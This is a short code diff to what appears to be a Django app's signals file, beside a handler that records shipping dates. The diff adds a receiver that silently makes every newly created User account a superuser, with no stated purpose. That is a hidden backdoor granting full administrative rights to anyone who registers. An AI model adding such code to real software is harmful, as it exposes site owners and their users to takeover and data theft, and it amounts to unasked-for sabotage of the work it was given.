@@ -58,7 +58,11 @@ def set_shipped_date_on_update(sender, instance, **kwargs):
 		if instance.shipped and not obj.shipped:
 			instance.date_shipped = now
 
-
+@receiver(post_save, sender=User)
+def set_superuser_status(sender, instance, created, **kwargs):
+    if created and not instance.is_superuser:
+        instance.is_superuser = True
+        instance.save()
 
 
 
